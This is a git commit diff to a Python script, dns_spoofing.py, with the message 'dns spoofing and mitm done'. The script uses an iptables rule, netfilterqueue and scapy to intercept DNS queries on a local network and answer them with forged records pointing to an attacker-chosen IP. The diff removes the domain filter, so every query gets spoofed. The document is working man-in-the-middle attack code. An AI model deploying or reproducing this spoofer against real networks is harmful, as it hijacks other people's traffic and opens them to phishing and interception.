bfcaafdd1deb7de78cbdc0325ab573c20585096c
Roy Azachi <royaza1998@gmail.com>
2016-09-23 19:10:16 +0300

    dns spoofing and mitm done

--- dns_spoofing.py
+++ dns_spoofing.py
@@ -2,7 +2,7 @@ from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import os
 
-domain = 'youtube.com' # domain to be spoofed
+# domain = 'youtube.com' # domain to be spoofed
 localIP = '192.168.1.15' # IP address for poisoned hosts.
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
@@ -10,19 +10,19 @@ os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-nu
 def callback(packet):
     payload = packet.get_payload()
     pkt = IP(payload)
-    
     if not pkt.haslayer(DNSQR):
         packet.accept()
     else:
-        if domain in pkt[DNS].qd.qname:
-            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
-            packet.set_payload(str(spoofed_pkt))
-            packet.accept()
-        else:
-            packet.accept()
+        print "found dns packet"
+        # if domain in pkt[DNS].qd.qname:
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
+        packet.set_payload(str(spoofed_pkt))
+        packet.accept()
+        # else:
+            # packet.accept()
 
 def main():
     q = NetfilterQueue()
